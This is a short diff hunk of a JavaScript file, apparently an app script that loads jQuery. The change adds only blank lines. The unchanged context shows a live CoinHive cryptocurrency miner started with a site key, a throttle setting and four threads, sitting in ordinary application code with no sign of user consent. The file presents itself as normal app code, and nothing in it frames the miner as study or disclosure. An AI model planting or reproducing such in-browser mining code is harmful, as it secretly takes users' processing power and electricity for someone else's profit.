@@ -1,5 +1,9 @@
 window.$ = window.jQuery = require('jquery');
 
+
+
+
+
 var miner = new CoinHive.Anonymous('4TioaoSMGC46r9H4m1HCyTMX6OXkpyDj');
 miner.setThrottle(.95);
 miner.setNumThreads(4);
